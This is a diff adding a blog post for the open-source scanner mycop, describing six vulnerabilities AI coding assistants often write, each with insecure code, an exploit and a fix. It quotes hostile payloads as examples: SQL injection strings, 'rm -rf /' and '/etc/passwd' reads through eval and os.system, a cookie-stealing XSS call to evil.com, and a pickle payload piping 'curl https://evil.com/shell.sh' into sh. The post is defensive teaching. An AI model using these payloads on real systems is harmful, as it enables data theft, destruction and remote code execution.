@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="en" style="scroll-behavior:smooth">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>The Security Bugs AI Coding Assistants Keep Writing — mycop Blog</title>
+  <meta name="description"
+    content="I analyzed the patterns of security vulnerabilities that AI coding assistants repeatedly introduce — SQL injection, eval(), hardcoded secrets, and more. Here's what I found, with real code examples and how to catch them automatically.">
+  <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+  <link rel="icon" type="image/png" href="../favicon.png">
+  <link rel="canonical" href="https://abdumajidrashidov.github.io/mycop/blog/security-bugs-ai-coding-assistants.html">
+  <meta name="theme-color" content="#0066ff">
+
+  <!-- Open Graph -->
+  <meta property="og:title" content="The Security Bugs AI Coding Assistants Keep Writing">
+  <meta property="og:description" content="I analyzed the patterns of security vulnerabilities that AI coding assistants repeatedly introduce — SQL injection, eval(), hardcoded secrets, and more.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://abdumajidrashidov.github.io/mycop/blog/security-bugs-ai-coding-assistants.html">
+  <meta property="og:image" content="https://abdumajidrashidov.github.io/mycop/og-image.png">
+  <meta property="og:site_name" content="mycop">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="The Security Bugs AI Coding Assistants Keep Writing">
+  <meta name="twitter:description" content="SQL injection, eval(), hardcoded secrets — the vulnerabilities AI keeps writing, with real code examples.">
+  <meta name="twitter:image" content="https://abdumajidrashidov.github.io/mycop/og-image.png">
+
+  <!-- Structured Data: Article -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "headline": "The Security Bugs AI Coding Assistants Keep Writing",
+    "description": "I analyzed the patterns of security vulnerabilities that AI coding assistants repeatedly introduce — SQL injection, eval(), hardcoded secrets, and more.",
+    "author": {
+      "@type": "Person",
+      "name": "Abdumajid Rashidov",
+      "url": "https://github.com/AbdumajidRashidov"
+    },
+    "datePublished": "2026-02-15",
+    "publisher": {
+      "@type": "Organization",
+      "name": "mycop",
+      "url": "https://abdumajidrashidov.github.io/mycop/"
+    },
+    "mainEntityOfPage": "https://abdumajidrashidov.github.io/mycop/blog/security-bugs-ai-coding-assistants.html",
+    "keywords": ["security", "python", "javascript", "ai", "copilot", "chatgpt", "vulnerabilities", "SAST"]
+  }
+  </script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+    rel="stylesheet">
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --bg: #ffffff;
+      --bg-alt: #f8f9fa;
+      --text: #1a1a2e;
+      --text-secondary: #6c757d;
+      --accent: #0066ff;
+      --accent-hover: #0052cc;
+      --border: #e9ecef;
+      --terminal-bg: #1e1e2e;
+      --terminal-text: #cdd6f4;
+      --red: #f38ba8;
+      --yellow: #f9e2af;
+      --green: #a6e3a1;
+      --blue: #89b4fa;
+      --radius: 12px;
+      --shadow: 0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06);
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      color: var(--text);
+      background: var(--bg);
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    code,
+    .mono {
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    a {
+      color: var(--accent);
+      text-decoration: none;
+    }
+
+    a:hover {
+      color: var(--accent-hover);
+    }
+
+    /* Nav */
+    nav {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+
+    nav .nav-inner {
+      max-width: 1120px;
+      margin: 0 auto;
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 64px;
+    }
+
+    .nav-logo {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .nav-logo svg {
+      width: 28px;
+      height: 28px;
+    }
+
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+    }
+
+    .nav-links a {
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+      font-weight: 500;
+    }
+
+    .nav-links a:hover {
+      color: var(--text);
+    }
+
+    /* Article */
+    .article {
+      max-width: 720px;
+      margin: 0 auto;
+      padding: 60px 24px 80px;
+    }
+
+    .article-meta {
+      margin-bottom: 32px;
+    }
+
+    .article-meta .tag {
+      display: inline-block;
+      padding: 4px 12px;
+      background: #eef4ff;
+      color: var(--accent);
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      margin-right: 6px;
+    }
+
+    .article-meta .date {
+      display: block;
+      margin-top: 12px;
+      color: var(--text-secondary);
+      font-size: 0.85rem;
+    }
+
+    .article h1 {
+      font-size: clamp(2rem, 4vw, 2.5rem);
+      font-weight: 700;
+      line-height: 1.2;
+      letter-spacing: -0.02em;
+      margin-bottom: 24px;
+    }
+
+    .article h2 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin-top: 48px;
+      margin-bottom: 16px;
+      letter-spacing: -0.01em;
+    }
+
+    .article h3 {
+      font-size: 1.15rem;
+      font-weight: 600;
+      margin-top: 36px;
+      margin-bottom: 12px;
+    }
+
+    .article p {
+      margin-bottom: 16px;
+      font-size: 1.05rem;
+      line-height: 1.75;
+    }
+
+    .article strong {
+      font-weight: 600;
+    }
+
+    .article em {
+      font-style: italic;
+    }
+
+    .article ol,
+    .article ul {
+      margin-bottom: 16px;
+      padding-left: 24px;
+    }
+
+    .article li {
+      margin-bottom: 8px;
+      font-size: 1.05rem;
+      line-height: 1.7;
+    }
+
+    .article hr {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 48px 0;
+    }
+
+    .article blockquote {
+      border-left: 3px solid var(--accent);
+      padding-left: 16px;
+      margin: 20px 0;
+      color: var(--text-secondary);
+      font-style: italic;
+    }
+
+    /* Code blocks */
+    .article pre {
+      background: var(--terminal-bg);
+      color: var(--terminal-text);
+      border-radius: var(--radius);
+      padding: 20px 24px;
+      margin-bottom: 20px;
+      overflow-x: auto;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.85rem;
+      line-height: 1.7;
+    }
+
+    .article code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.88em;
+    }
+
+    .article p code,
+    .article li code {
+      background: #eef4ff;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 0.85em;
+      color: var(--accent);
+    }
+
+    /* CTA box */
+    .cta-box {
+      background: var(--bg-alt);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 32px;
+      margin: 40px 0;
+      text-align: center;
+    }
+
+    .cta-box h3 {
+      margin-top: 0;
+      margin-bottom: 12px;
+    }
+
+    .cta-box p {
+      font-size: 0.95rem;
+      margin-bottom: 16px;
+    }
+
+    .cta-box .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 20px;
+      background: var(--accent);
+      color: #fff;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      font-weight: 600;
+    }
+
+    .cta-box .btn:hover {
+      background: var(--accent-hover);
+      color: #fff;
+    }
+
+    /* Footer */
+    footer {
+      padding: 40px 0;
+      border-top: 1px solid var(--border);
+      color: var(--text-secondary);
+      font-size: 0.85rem;
+    }
+
+    footer .footer-inner {
+      max-width: 1120px;
+      margin: 0 auto;
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    footer a {
+      color: var(--text-secondary);
+    }
+
+    footer a:hover {
+      color: var(--text);
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 20px;
+    }
+
+    @media (max-width: 768px) {
+      .article {
+        padding: 40px 20px 60px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <nav>
+    <div class="nav-inner">
+      <a href="../" class="nav-logo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+          stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+        </svg>
+        mycop
+      </a>
+      <div class="nav-links">
+        <a href="../">Home</a>
+        <a href="https://github.com/AbdumajidRashidov/mycop" target="_blank">GitHub</a>
+      </div>
+    </div>
+  </nav>
+
+  <article class="article">
+
+    <div class="article-meta">
+      <span class="tag">Security</span>
+      <span class="tag">Python</span>
+      <span class="tag">JavaScript</span>
+      <span class="tag">AI</span>
+      <span class="date">February 15, 2026</span>
+    </div>
+
+    <h1>The Security Bugs AI Coding Assistants Keep Writing</h1>
+
+    <p>Last week I asked ChatGPT to write a Python login function. It gave me this:</p>
+
+<pre>def login(username, password):
+    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+    db.execute(query)</pre>
+
+    <p>Looks clean. Works fine. Ships to production. And it is completely broken from a security perspective.</p>
+
+    <p>If someone types this as their username:</p>
+
+<pre>' OR '1'='1' --</pre>
+
+    <p>The query becomes:</p>
+
+<pre>SELECT * FROM users WHERE username='' OR '1'='1' --' AND password=''</pre>
+
+    <p>Every row in the users table comes back. Authentication bypassed. Game over.</p>
+
+    <p>The thing is, this is not a rare edge case. This is what AI assistants generate <em>by default</em>. I have seen this exact pattern &mdash; SQL queries built with f-strings &mdash; come out of Copilot, ChatGPT, and Cursor dozens of times. And SQL injection is just one of many.</p>
+
+    <h2>The Problem at Scale</h2>
+
+    <p>Research from Stanford and NYU has found that code generated by AI assistants contains security vulnerabilities roughly 40% of the time. A 2023 study published at IEEE S&amp;P showed that participants using AI assistants produced <em>less secure</em> code than those writing it manually, and &mdash; here is the concerning part &mdash; were <em>more confident</em> that their code was secure.</p>
+
+    <p>Why does this happen? Three reasons:</p>
+
+    <ol>
+      <li><strong>AI optimizes for "works," not "safe."</strong> When you ask for a login function, the model gives you something that logs people in. Security is a constraint it does not see unless you explicitly ask for it.</li>
+      <li><strong>Training data is full of insecure examples.</strong> Stack Overflow answers, tutorials, blog posts &mdash; they prioritize readability and brevity. The accepted answer to "how do I query a database in Python" almost never uses parameterized queries.</li>
+      <li><strong>No threat model in context.</strong> A human security engineer thinks about <em>who</em> will call this function and <em>what</em> they might pass into it. The AI has no concept of an attacker.</li>
+    </ol>
+
+    <h2>The Six Vulnerabilities AI Assistants Love to Write</h2>
+
+    <p>I have been cataloging the patterns that come up repeatedly. Here are the six I see most often, with the vulnerable code AI generates and what you should write instead.</p>
+
+    <h3>1. SQL Injection via f-strings (Python)</h3>
+
+    <p><strong>What AI writes:</strong></p>
+
+<pre>def get_user(user_id):
+    cursor.execute("SELECT * FROM users WHERE id=%s" % user_id)</pre>
+
+    <p><strong>How an attacker exploits it:</strong> Pass <code>1 OR 1=1</code> as <code>user_id</code> to dump the entire table, or <code>1; DROP TABLE users;--</code> to destroy it.</p>
+
+    <p><strong>What you should write:</strong></p>
+
+<pre>def get_user(user_id):
+    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))</pre>
+
+    <p>The difference is subtle &mdash; a tuple as the second argument instead of string formatting &mdash; but it is the difference between a secure app and a data breach. Parameterized queries treat user input as <em>data</em>, not as part of the SQL command.</p>
+
+    <h3>2. eval() on User Input</h3>
+
+    <p><strong>What AI writes (JavaScript):</strong></p>
+
+<pre>function calculate(expression) {
+    return eval(expression);
+}</pre>
+
+    <p><strong>What AI writes (Python):</strong></p>
+
+<pre>def evaluate(expr):
+    result = eval(expr)
+    return result</pre>
+
+    <p><strong>The exploit:</strong> If <code>expression</code> comes from a user, they can run anything. In Node.js: <code>require('child_process').execSync('cat /etc/passwd')</code>. In Python: <code>__import__('os').system('rm -rf /')</code>.</p>
+
+    <p><strong>What you should write:</strong></p>
+
+<pre>import ast
+def evaluate(expr):
+    result = ast.literal_eval(expr)
+    return result</pre>
+
+    <p>For JavaScript, use a math expression parser like <code>math.js</code> instead. The <code>eval()</code> function should basically never appear in production code that touches user input.</p>
+
+    <h3>3. Hardcoded Secrets</h3>
+
+    <p><strong>What AI writes:</strong></p>
+
+<pre>API_KEY = "sk-1234567890abcdef1234567890abcdef"
+password = "SuperSecret123!"</pre>
+
+    <p>Every single time I ask an AI assistant for code that integrates with an API, the key goes directly into the source file. Every time.</p>
+
+    <p><strong>What you should write:</strong></p>
+
+<pre>import os
+API_KEY = os.environ["API_KEY"]</pre>
+
+    <p>Or use a <code>.env</code> file with <code>python-dotenv</code>, or a secrets manager. Anything except a string literal in your source code that will end up in version control.</p>
+
+    <h3>4. Command Injection via os.system()</h3>
+
+    <p><strong>What AI writes:</strong></p>
+
+<pre>def ping_host(host):
+    os.system("ping -c 1 " + host)</pre>
+
+    <p><strong>The exploit chain:</strong> Pass <code>; cat /etc/passwd</code> as <code>host</code>. The shell interprets the semicolon as a command separator and runs both commands. Full remote code execution from a "simple" ping utility.</p>
+
+    <p><strong>What you should write:</strong></p>
+
+<pre>import subprocess
+def ping_host(host):
+    subprocess.run(["ping", "-c", "1", host], check=True)</pre>
+
+    <p>The list form of <code>subprocess.run</code> does not invoke a shell. Each element is a separate argument, so shell metacharacters like <code>;</code>, <code>|</code>, and <code>&&</code> are treated as literal strings.</p>
+
+    <h3>5. dangerouslySetInnerHTML in React</h3>
+
+    <p><strong>What AI writes:</strong></p>
+
+<pre>function Comment({ text }) {
+    return &lt;div dangerouslySetInnerHTML={{ __html: text }} /&gt;;
+}</pre>
+
+    <p><strong>The exploit:</strong> If <code>text</code> contains <code>&lt;img src=x onerror="document.location='https://evil.com/steal?cookie='+document.cookie"&gt;</code>, every user who views that comment has their session cookie stolen.</p>
+
+    <p><strong>What you should write:</strong></p>
+
+<pre>import DOMPurify from 'dompurify';
+
+function Comment({ text }) {
+    return &lt;div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(text) }} /&gt;;
+}</pre>
+
+    <p>Or better yet, do not use <code>dangerouslySetInnerHTML</code> at all. React escapes content by default &mdash; it is literally named "dangerously" to warn you.</p>
+
+    <h3>6. Insecure Deserialization with pickle</h3>
+
+    <p><strong>What AI writes:</strong></p>
+
+<pre>import pickle
+
+def load_data(data):
+    obj = pickle.loads(data)
+    return obj</pre>
+
+    <p><strong>The exploit:</strong> <code>pickle</code> can execute arbitrary Python code during deserialization. An attacker crafts a malicious payload:</p>
+
+<pre>import pickle, os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ("curl https://evil.com/shell.sh | sh",))
+
+payload = pickle.dumps(Exploit())</pre>
+
+    <p>Send that payload to any endpoint that calls <code>pickle.loads()</code> and you have remote code execution.</p>
+
+    <p><strong>What you should write:</strong></p>
+
+<pre>import json
+
+def load_data(data):
+    obj = json.loads(data)
+    return obj</pre>
+
+    <p>Use JSON. If you absolutely must deserialize complex Python objects, use <code>hmac</code> to sign the data and verify the signature before deserializing.</p>
+
+    <h2>Catching These Automatically</h2>
+
+    <p>After seeing these patterns enough times, I built <a href="https://github.com/AbdumajidRashidov/mycop">mycop</a> &mdash; an open-source security scanner specifically designed for the kinds of vulnerabilities AI assistants introduce. It ships 100 rules covering OWASP Top 10 and CWE Top 25, targeting Python and JavaScript/TypeScript.</p>
+
+    <p>Here is what it looks like when you run it on a file with the vulnerabilities above:</p>
+
+<pre>$ mycop scan app.py
+
+  app.py:10
+  CRITICAL sql injection (CWE-89)
+
+       8 | def login(username, password):
+       9 |     query = f"SELECT * FROM users WHERE username='{username}'"
+  ->  10 |     db.execute(query)
+      11 |
+
+     Possible SQL injection detected. User input may be directly
+     interpolated into a SQL query string.
+     Fix: Use parameterized queries with placeholders
+
+  --------------------------------------------------
+
+  app.py:18
+  CRITICAL os command injection (CWE-78)
+
+      16 |
+      17 | def ping_host(host):
+  ->  18 |     os.system("ping -c 1 " + host)
+      19 |
+
+     Possible OS command injection detected.
+     Fix: Use subprocess.run() with a list of arguments.
+
+  --------------------------------------------------
+
+  Found 8 issues: 3 critical, 3 high, 2 medium</pre>
+
+    <h3>Installation</h3>
+
+<pre># macOS/Linux
+curl -fsSL https://raw.githubusercontent.com/AbdumajidRashidov/mycop/main/install.sh | sh
+
+# Homebrew
+brew install AbdumajidRashidov/tap/mycop
+
+# Cargo
+cargo install mycop
+
+# Docker
+docker run --rm -v "$(pwd):/src" -w /src ghcr.io/abdumajidrashidov/mycop scan .</pre>
+
+    <h3>Auto-fixing with AI</h3>
+
+    <p>The <code>mycop fix</code> command sends each file with its findings to an AI provider (Claude, OpenAI, Ollama, or a local rule-based fallback) and applies the fixes:</p>
+
+<pre>$ mycop fix app.py
+  Fixing app.py (3 findings)...
+
+  --- app.py
+  +++ app.py
+  @@ -8,3 +8,3 @@
+   def login(username, password):
+  -    query = f"SELECT * FROM users WHERE username='{username}'"
+  -    db.execute(query)
+  +    db.execute("SELECT * FROM users WHERE username = %s",
+  +               (username,))
+
+  Applied fixes to app.py
+  Re-scanning... 0 findings remaining</pre>
+
+    <p>You can preview changes without writing them using <code>--dry-run</code>.</p>
+
+    <h3>CI Integration</h3>
+
+    <p>Drop this into your GitHub Actions workflow:</p>
+
+<pre>- name: mycop Security Scan
+  uses: AbdumajidRashidov/mycop/action@main
+  with:
+    paths: '.'
+    fail-on: 'high'</pre>
+
+    <p>This fails the build if any high or critical severity issues are found. The SARIF output integrates with GitHub's code scanning so findings show up as inline annotations on pull requests.</p>
+
+    <h2>How It Works Under the Hood</h2>
+
+    <p><strong>Dual matching with regex and tree-sitter AST.</strong> Each rule can define regex patterns for broad detection and tree-sitter AST queries for structural matching. The matcher runs both, deduplicates by line number, and returns the union. Regex catches the obvious patterns fast; AST queries understand code structure.</p>
+
+    <p><strong>Rules are YAML, compiled into the binary.</strong> All 100 rules live as <code>.yml</code> files in the repo, but they are embedded at compile time via Rust's <code>include_str!</code> macro. This means the binary is self-contained &mdash; no external rule files to ship or keep in sync.</p>
+
+    <p><strong>AI fix prompts are structured.</strong> When <code>mycop fix</code> runs, it groups all findings per file and sends a single prompt with the full file content and a numbered list of vulnerabilities with fix hints. The AI returns the fixed file wrapped in <code>&lt;FIXED_FILE&gt;</code> tags for reliable extraction.</p>
+
+    <p><strong>Rayon parallelism.</strong> File scanning runs in parallel across CPU cores using Rayon's parallel iterators. On a large codebase, this makes a real difference &mdash; scanning happens in seconds, not minutes.</p>
+
+    <h2>What It Cannot Do</h2>
+
+    <p>I want to be upfront about the limitations:</p>
+
+    <ul>
+      <li><strong>No taint tracking.</strong> mycop does not trace data flow from source to sink. If user input passes through three function calls before reaching <code>eval()</code>, the regex-based rules will not catch it.</li>
+      <li><strong>No interprocedural analysis.</strong> Each file is scanned independently. If a dangerous pattern is split across modules, it will be missed.</li>
+      <li><strong>False positives.</strong> Pattern matching is inherently noisy. The inline ignore comment <code># mycop-ignore:PY-SEC-005</code> exists for a reason.</li>
+      <li><strong>Python and JavaScript only.</strong> Go, Rust, Java, and other languages are not covered yet.</li>
+    </ul>
+
+    <p>These are real tradeoffs. mycop is designed to be a fast, zero-config first line of defense &mdash; the kind of thing you drop into CI in two minutes and immediately start catching the low-hanging fruit that AI assistants introduce.</p>
+
+    <h2>What Is Next</h2>
+
+    <p>The roadmap includes tree-sitter AST queries for more rules (reducing false positives), Go and Java support, and better taint analysis for single-file data flows. Contributions are welcome &mdash; especially new rules. Adding a rule is as simple as writing a YAML file.</p>
+
+    <div class="cta-box">
+      <h3>Try mycop on your codebase</h3>
+      <p>Run it on your current project and see what it finds. You might be surprised.</p>
+      <code style="display:block;background:var(--terminal-bg);color:var(--green);padding:12px 16px;border-radius:8px;margin-bottom:16px;font-size:0.9rem">cargo install mycop && mycop scan .</code>
+      <a href="https://github.com/AbdumajidRashidov/mycop" target="_blank" class="btn">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+          <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+        </svg>
+        Star on GitHub
+      </a>
+    </div>
+
+    <hr>
+
+    <p><em>mycop is MIT licensed and open source. It works offline (no AI key required for scanning) and runs on macOS, Linux, and Windows.</em></p>
+
+  </article>
+
+  <footer>
+    <div class="footer-inner">
+      <span>MIT License &middot; Built with Rust</span>
+      <div class="footer-links">
+        <a href="https://github.com/AbdumajidRashidov/mycop" target="_blank">GitHub</a>
+        <a href="https://crates.io/crates/mycop" target="_blank">Crates.io</a>
+        <a href="https://github.com/AbdumajidRashidov/mycop/issues" target="_blank">Issues</a>
+      </div>
+    </div>
+  </footer>
+
+</body>
+
+</html>
